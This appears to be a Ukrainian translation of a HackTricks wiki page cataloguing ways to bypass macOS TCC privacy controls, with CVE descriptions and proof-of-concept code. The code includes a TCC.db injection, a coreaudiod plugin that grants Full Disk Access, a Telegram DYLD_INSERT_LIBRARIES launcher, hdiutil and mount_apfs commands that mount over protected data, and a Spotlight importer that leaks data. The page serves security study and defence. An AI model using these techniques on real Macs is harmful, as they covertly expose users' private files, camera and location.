# Обходи TCC у macOS

{{#include ../../../../../banners/hacktricks-training.md}}

Щоб дізнатися про сховище дозволів TCC та атрибуцію відправника/цілі Automation, див. [огляд TCC у macOS](../index.html#identify-apple-events-sender-and-target-grants).

## За функціональністю

### Обхід запису

Це не обхід, а просто принцип роботи TCC: **він не захищає від запису**. Якщо Terminal **не має доступу до читання Desktop користувача, він усе одно може записувати туди**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

Розширений атрибут **`com.apple.macl`** додається до нового **файлу**, щоб надати **застосунку-автору** доступ до його читання.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Можна **розмістити вікно поверх запиту TCC**, щоб змусити користувача **погодитися**, не помітивши цього. PoC можна знайти в [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Запит TCC від імені довільного застосунку

Зловмисник може **створювати застосунки з будь-якою назвою** (наприклад, Finder, Google Chrome...) у **`Info.plist`** і змусити їх запитувати доступ до певного місця, захищеного TCC. Користувач думатиме, що доступ запитує легітимний застосунок.\
Крім того, можна **видалити легітимний застосунок із Dock і розмістити там підроблений**, щоб натискання на нього (він може використовувати ту саму іконку) запускало легітимний застосунок, запитувало дозволи TCC і виконувало malware, змушуючи користувача повірити, що доступ запросив легітимний застосунок.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Додаткова інформація та PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

За замовчуванням доступ через **SSH мав «Full Disk Access»**. Щоб вимкнути його, потрібно залишити SSH у списку, але вимкнути його (видалення зі списку не скасує ці привілеї):<sup>[[2]](#references)</sup>

![Запит TCC від імені довільного застосунку - SSH Bypass: За замовчуванням доступ через SSH мав «Full Disk Access». Щоб вимкнути його, потрібно залишити SSH у списку, але вимкнути його (видалення зі списку...](<../../../../../images/image (1077).png>)

Тут наведено приклади того, як деяким **malware вдавалося обійти цей захист**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Зверніть увагу: тепер для ввімкнення SSH потрібен **Full Disk Access**

### Обробка розширень - CVE-2022-26767

Атрибут **`com.apple.macl`** надається файлам, щоб надати **певному застосунку дозвіл на їх читання.** Цей атрибут встановлюється, коли файл **перетягують** на застосунок або коли користувач **двічі клацає** файл, щоб відкрити його у **застосунку за замовчуванням**.

Отже, користувач може **зареєструвати шкідливий застосунок** для обробки всіх розширень і викликати Launch Services, щоб **відкрити** будь-який файл (тоді шкідливий застосунок отримає дозвіл на його читання).<sup>[[23]](#references)</sup>

### iCloud

Право **`com.apple.private.icloud-account-access`** дає змогу взаємодіяти зі службою XPC **`com.apple.iCloudHelper`**, яка **надаватиме токени iCloud**.

**iMovie** і **Garageband** мали це та інші права, які дозволяли це робити.

Щоб дізнатися більше про експлойт для **отримання токенів iCloud** завдяки цьому праву, перегляньте доповідь: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Витік даних через назви Darwin-повідомлень від імпортера Spotlight

Імпортер Spotlight може читати файл, який Spotlight передає його callback-функції `GetMetadataForFile`, навіть якщо звичайний процес без Full Disk Access не може його прочитати. На відміну від [ін’єкції коду в процес, авторизований TCC](../macos-tcc-credential-and-data-theft.md), для цього потрібна локальна точка опори, що дає змогу встановити імпортер і дочекатися відповідної події індексування Spotlight. Імпортер працює в sandbox, але Darwin-повідомлення, що містять лише назву, можуть передавати байти слухачеві поза цим sandbox. Це канал витоку даних (data-leak), а не спосіб отримати root або довільний доступ до файлів з імпортера.<sup>[[24]](#references)</sup>

Укажіть тип цільового файлу в `CFBundleDocumentTypes` → `LSItemContentTypes` у файлі `Info.plist` імпортера, а потім установіть пакет у `~/Library/Spotlight/` або `Contents/Library/Spotlight/` застосунку. Перевірте реєстрацію за допомогою `mdimport -L`. У [розділі про імпортери Spotlight](../../../../macos-auto-start-locations.md#spotlight-plugins) описано розміщення пакетів і зіставлення типів файлів. Імпортер отримує лише ті файли, які йому призначає Spotlight; зазвичай перевагу має вже наявний імпортер. У macOS 26 Tahoe команда `mdimport -i` у наведених тестах не завжди надійно запускала негайне рекурсивне індексування, тоді як `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` запитувала повторний імпорт UTI, заявлених цим імпортером.<sup>[[24]](#references)</sup>

Щоб перевірити канал, запустіть слухач поза sandbox за допомогою `notifyutil -w TEST_TEST_TEST`, а потім надішліть повідомлення через `CFNotificationCenterGetDarwinNotifyCenter()` із `NULL` для об’єкта та `userInfo`. На відміну від distributed notification із payload `userInfo`, Darwin-повідомлення містить лише назву. Для бінарних даних зареєструйте зовнішнього слухача для десяткових назв від `0` до `255` за допомогою `notify_register_dispatch`; зіставте реєстрацію кожного callback із відповідним значенням байта. Усередині `GetMetadataForFile` читайте лише переданий Spotlight шлях `pathToFile` і надсилайте кожен байт як десяткову назву повідомлення:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

Listener відновлює послідовність байтів, а не читає сам файл, захищений TCC. Опублікований PoC відновив перші 64 байти `knowledgeC.db` з термінала без FDA за ввімкненого SIP у macOS 26. Це низькошвидкісний спосіб, який не підходить для надійного копіювання великих обсягів даних: Spotlight може не індексувати цільовий файл або не переіндексувати його, а паралельні екземпляри імпортера можуть перемішувати потоки сповіщень. Інші механізми обходу меж пісочниці див. у розділі [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/).<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

Застосунок із дозволом **`kTCCServiceAppleEvents`** зможе **керувати іншими застосунками**. Це означає, що він може **зловживати дозволами, наданими іншим застосункам**.<sup>[[2]](#references)</sup>

Докладніше про Apple Scripts:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Наприклад, якщо застосунок має **дозвіл Automation для `iTerm`**, як у цьому прикладі, де **`Terminal`** має доступ до iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Через iTerm

Terminal, який не має FDA, може викликати iTerm, у якого він є, і використовувати його для виконання дій:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Через Finder

Або якщо програма має доступ через Finder, вона може запустити такий скрипт:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Поведінка застосунку

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Демон **tccd** у **просторі користувача** використовував змінну **`HOME`** **середовища** для доступу до бази даних TCC користувача за шляхом: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Згідно з [цією публікацією на Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), оскільки демон TCC запускається через `launchd` у домені поточного користувача, можна **контролювати всі змінні середовища**, які йому передаються.<sup>[[19]](#references)</sup>\
Отже, **зловмисник може задати змінну середовища `$HOME`** у **`launchctl`**, щоб вказати на **контрольований** **каталог**, **перезапустити** демон **TCC**, а потім **безпосередньо змінити базу даних TCC**, надавши собі **всі доступні права TCC** без запиту до кінцевого користувача.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes мала доступ до локацій, захищених TCC, але щойно створена нотатка **зберігалася в незахищеній локації**. Тому зловмисник міг попросити Notes скопіювати захищений файл у нотатку, а потім отримати доступ до цих даних у незахищеній локації:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Бінарний файл `/usr/libexec/lsd` із бібліотекою `libsecurity_translocate` мав entitlement `com.apple.private.nullfs_allow`, який дозволяв йому створювати монтування **nullfs**, а також entitlement `com.apple.private.tcc.allow` із **`kTCCServiceSystemPolicyAllFiles`** для доступу до всіх файлів.

Можна було додати атрибут карантину до "Library", викликати XPC-сервіс **`com.apple.security.translocation`**, після чого він зіставляв Library із **`$TMPDIR/AppTranslocation/d/d/Library`**, де можна було **отримати доступ** до всіх документів у Library.

### CVE-2024-44131 - FileProvider symlink race

Програми, що передають файлові операції **привілейованому помічнику** (тут — **`fileproviderd`** / `Files.app`), копіюють або переміщують елементи **від імені користувача**, тож копіювання виконується з привілеями помічника, а не процесу-виклику.

Jamf Threat Labs показала, що перевірку symlink, яка виконується перед операцією, можна **обійти за допомогою race**: замість створення symlink для **останнього** компонента шляху (який перевіряється), зловмисник підміняє **проміжний** каталог шляху **після того, як копіювання вже почалося**. Тоді привілейований помічник переходить за контрольованим зловмисником посиланням і читає/записує дані в локаціях, захищених TCC, **не показуючи жодного запиту на дозвіл**.<sup>[[5]](#references)</sup>

Найпростіші цілі — каталоги, шлях до яких **не** захищено випадковим UUID (наприклад, `~/Library/Mobile Documents/com~apple~CloudDocs`), оскільки зловмисник може передбачити повний шлях для race.

> [!TIP]
> Ось загальний шаблон, на який слід звертати увагу: **будь-який привілейований процес, який повторно розв’язує шлях** (перевірка з подальшим використанням або окреме розв’язання `rename()`/`copyfile()` для джерела й призначення), можна атакувати за допомогою race, підмінивши каталог усередині шляху. Вікно вразливості справді закривають лише `O_NOFOLLOW_ANY`, `openat()` для вже відкритого дескриптора каталогу FD або `realpath()` із повторною перевіркою.

Більше інформації — у [**публікації Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` можна зібрати з `SQLITE_ENABLE_SQLLOG`, що додає механізм логування, керований змінними середовища ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** — для **кожної відкритої бази даних** у `path` записується **копія файла бази даних** і журнал SQL-інструкцій (каталог має вже існувати).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** — щоразу під час відкриття/приєднання бази даних створювати **нову копію**, а не використовувати наявну.
- **`SQLITE_SQLLOG_CONDITIONAL`** — журналювати з’єднання, лише якщо поруч з основною БД існує файл `<database>-sqllog`.

Якщо вдасться впровадити цю змінну в процес, який має **FDA** і відкриває бази SQLite, він охоче **копіюватиме ці захищені бази даних** у каталог, який ви контролюєте. Оскільки ім’я файла призначення формується з даних, контрольованих зловмисником, **symlink, створений у місці призначення**, перетворює той самий примітив на **запис у довільний файл** із привілеями цільового процесу.

### **SQLITE_AUTO_TRACE**

Якщо встановлено змінну середовища **`SQLITE_AUTO_TRACE`**, бібліотека **`libsqlite3.dylib`** почне **журналювати** всі SQL-запити. Цю бібліотеку використовували багато програм, тож можна було журналювати всі їхні SQL-запити.<sup>[[22]](#references)</sup>

Кілька програм Apple використовували цю бібліотеку для доступу до інформації, захищеної TCC.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### Пошук запису файлів через змінні середовища

Два попередні приклади — це різновиди однієї загальної техніки, тож варто пошукати й інші: **frameworks, завантажені в застосунки з привілеями TCC, часто надають debug/logging-змінні середовища, через які процес створює файл за шляхом, контрольованим викликачем**.

Як їх знаходити:

1. Виберіть ціль із FDA або іншим цінним дозволом TCC (`Music`, `TV`, `Terminal`, агенти MDM...) і перегляньте frameworks, з якими вона пов’язана (`otool -L`, `vmmap`).
2. Пошукайте в цих frameworks рядки `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Задайте змінні-кандидати за допомогою `launchctl setenv NAME /path/you/control`, запустіть застосунок і стежте за його діями у файловій системі за допомогою `fs_usage -w -f filesys <pid>` або `sudo fs_usage | grep <path>`.
4. Якщо процес **створює файл або перейменовує** його у вашій директорії, у вас є примітив запису: спрямуйте призначення на symlink (або влаштуйте race для проміжної директорії, як у CVE-2024-44131 вище), щоб перенаправити запис у `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Цьому є два обмеження. По-перше, **змінні `DYLD_*` ігноруються для бінарних файлів із hardened runtime**, якщо застосунок не містить entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) («логічне значення, яке вказує, чи можуть на застосунок впливати змінні середовища dynamic linker, які можна використовувати для впровадження коду в процес застосунку») — див. також [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). По-друге, Apple видаляє окремі debug-змінні frameworks після повідомлень про них, тож змінна, що працювала в одному випуску macOS, часто зникає в наступному. Якщо застосунок мовчки відмовляється запускатися після її встановлення, вважайте, що цю змінну вже відфільтровано.<sup>[[7]](#references)[[8]](#references)</sup>

Див. [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) — аналогічний прийом зі змінними linker.

### Apple Remote Desktop

Від імені root можна ввімкнути цю службу, і **агент ARD матиме повний доступ до диска**. Потім користувач може зловживати цим, змусивши його скопіювати нову **базу даних користувача TCC**.

## За допомогою **NFSHomeDirectory**

TCC використовує базу даних у папці HOME користувача для контролю доступу до ресурсів, специфічних для цього користувача: **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Отже, якщо користувачеві вдасться перезапустити TCC зі змінною середовища $HOME, що вказує на **іншу папку**, він зможе створити нову базу даних TCC у **/Library/Application Support/com.apple.TCC/TCC.db** і змусити TCC надати будь-якому застосунку будь-який дозвіл TCC.

> [!TIP]
> Зверніть увагу: Apple використовує значення атрибута **`NFSHomeDirectory`**, збереженого в профілі користувача, як **значення `$HOME`**. Тож якщо ви скомпрометуєте застосунок, що має дозвіл змінювати це значення (**`kTCCServiceSystemPolicySysAdminFiles`**), цю опцію можна **перетворити на зброю** для обходу TCC.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

У **першому POC** використовуються [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) і [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/), щоб змінити папку **HOME** користувача.

1. Отримайте blob _csreq_ для цільового застосунку.
2. Розмістіть підроблений файл _TCC.db_ із потрібним доступом і blob _csreq_.
3. Експортуйте запис користувача з Directory Services за допомогою [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Змініть запис Directory Services, щоб змінити домашню директорію користувача.
5. Імпортуйте змінений запис Directory Services за допомогою [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Зупиніть _tccd_ користувача та перезапустіть процес.

У другому POC використовувався **`/usr/libexec/configd`**, що мав `com.apple.private.tcc.allow` зі значенням `kTCCServiceSystemPolicySysAdminFiles`.\
`configd` можна було запустити з опцією **`-t`**, що давало змогу зловмиснику вказати **власний Bundle для завантаження**. Тож експлойт **замінює** спосіб зміни домашньої директорії користувача через **`dsexport`** і **`dsimport`** на **ін’єкцію коду в `configd`**.

Докладніше див. [**оригінальний звіт**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## За допомогою process injection

Існують різні техніки для ін’єкції коду в процес і зловживання його привілеями TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Крім того, найпоширеніший спосіб process injection для обходу TCC — це **plugins (load library)**.\
Plugins — це додатковий код, зазвичай у вигляді бібліотек або plist, який **завантажує основний застосунок** і виконує в його контексті. Отже, якщо основний застосунок мав доступ до файлів, обмежених TCC (через надані дозволи або entitlements), **власний код також матиме цей доступ**.

### CVE-2020-27937 - Directory Utility

Застосунок `/System/Library/CoreServices/Applications/Directory Utility.app` мав entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, завантажував plugins із розширенням **`.daplug`** і **не мав hardened runtime**.

Щоб використати цю CVE, **змінюється** **`NFSHomeDirectory`** (із використанням попереднього entitlement), щоб **отримати контроль над базою даних TCC користувача** й обійти TCC.

Докладніше див. [**оригінальний звіт**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Бінарний файл **`/usr/sbin/coreaudiod`** мав entitlements `com.apple.security.cs.disable-library-validation` і `com.apple.private.tcc.manager`. Перший **дозволяв ін’єкцію коду**, а другий надавав йому доступ до **керування TCC**.

Цей бінарний файл дозволяв завантажувати **сторонні plug-ins** із папки `/Library/Audio/Plug-Ins/HAL`. Тож можна було **завантажити plugin і зловживати дозволами TCC** за допомогою цього PoC:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

Щоб дізнатися більше, перегляньте [**оригінальний звіт**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Розширення Device Abstraction Layer (DAL)

Системні програми, які відкривають потік із камери через Core Media I/O (програми з **`kTCCServiceCamera`**), завантажують у процес ці плагіни, розташовані в `/Library/CoreMediaIO/Plug-Ins/DAL` (не обмежені SIP).

Достатньо просто зберегти там бібліотеку зі звичайним **constructor**, щоб **впровадити код**.

Кілька програм Apple були вразливими до цього.

### Firefox

Програма Firefox мала entitlements `com.apple.security.cs.disable-library-validation` і `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Більше інформації про те, як легко це експлуатувати, див. у [**початковому звіті**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Бінарний файл `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` мав entitlements **`com.apple.private.tcc.allow`** і **`com.apple.security.get-task-allow`**, що дозволяло впроваджувати код у процес і використовувати привілеї TCC.

### CVE-2023-26818 - Telegram

Telegram мав entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** і **`com.apple.security.cs.disable-library-validation`**, тому цим можна було скористатися, щоб **отримати доступ до його дозволів**, наприклад для запису з камери. [**Знайти payload можна в описі експлойта**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Зверніть увагу: для завантаження бібліотеки за допомогою змінної середовища було створено **власний plist**, щоб впровадити цю бібліотеку, а для її запуску використано **`launchctl`**:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Через відкриті виклики

Можна викликати **`open`**, навіть перебуваючи в sandbox

### Скрипти Terminal

На комп’ютерах, якими користуються технічні фахівці, Terminal часто надають **Full Disk Access (FDA)**. Також із його допомогою можна запускати скрипти **`.terminal`**.

Скрипти **`.terminal`** — це plist-файли, як-от цей, із командою для виконання в ключі **`CommandString`**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

Програма могла б записати скрипт термінала в таке місце, як /tmp, і запустити його командою на кшталт:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Через монтування

### CVE-2020-9771 - обхід TCC і підвищення привілеїв через mount_apfs

**Будь-який користувач** (навіть без привілеїв) може створити й змонтувати знімок Time Machine та отримати доступ до **ВСІХ файлів** цього знімка.\
**Єдиний потрібний привілей** — щоб програма, яку використовують (наприклад, `Terminal`), мала доступ **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), який має надати адміністратор.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

Більш детальне пояснення [**можна знайти в оригінальному звіті**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 — Монтування поверх файлу TCC

Навіть якщо файл бази даних TCC захищений, можна було **змонтувати поверх каталогу** новий файл TCC.db:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Перегляньте **повний exploit** в [**оригінальному описі**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Як пояснено в [оригінальному описі](https://www.kandji.io/blog/macos-audit-story-part2), ця CVE використовувала `diskarbitrationd`.<sup>[[16]](#references)</sup>

Функція `DADiskMountWithArgumentsCommon` із загальнодоступного фреймворку `DiskArbitration` виконувала перевірки безпеки. Однак їх можна було обійти, безпосередньо викликавши `diskarbitrationd`, а отже, використати елементи `../` у шляху та символічні посилання.

Це дозволяло зловмиснику монтувати довільні файлові системи в будь-якому місці, зокрема поверх бази даних TCC, завдяки entitlement `com.apple.private.security.storage-exempt.heritable` процесу `diskarbitrationd`.

### asr

Інструмент **`/usr/sbin/asr`** дозволяв копіювати весь диск і монтувати його в іншому місці, обходячи захист TCC.

### CVE-2022-22655 - Служби геолокації

Служби геолокації **не** зберігаються в базі даних TCC, як інші служби. Ними керує `locationd`, який зберігає власний список дозволених клієнтів у **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Кожен запис має ключем клієнта (ідентифікатор пакета або шлях до виконуваного файла) і містить поля, такі як `Authorized`, `BundleId`, `Executable` і `Registered`.<sup>[[4]](#references)</sup>

Сам файл `clients.plist` захищений Sandbox/TCC, і його не можна редагувати навіть із правами root — але **каталог `/var/db/locationd/` не був захищений від монтування**. Тож зловмисник із правами root міг створити образ диска з власним `clients.plist` (у якому його бінарний файл позначено як `Authorized`), змонтувати його поверх каталогу та перезапустити `locationd`, щоб підроблений список дозволів набув чинності.<sup>[[3]](#references)</sup>

> [!TIP]
> Це той самий принцип, що й у наведених вище TCC bypass із `hdiutil`/`mount`: *файл* захищений, а *каталог, у якому він міститься*, — ні, тож замість файла підмінюють увесь каталог.

## Через програми автозапуску


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Через grep

У багатьох випадках файли зберігають конфіденційну інформацію, як-от електронні адреси, номери телефонів, повідомлення тощо, у незахищених місцях (що в Apple вважають вразливістю).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Зараз це вже не працює, але [**раніше працювало**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Ще один спосіб — використання [**подій CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>



## References

- [1] [CVE-2020–9934: обхід фреймворку macOS Transparency, Consent, and Control (TCC)](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
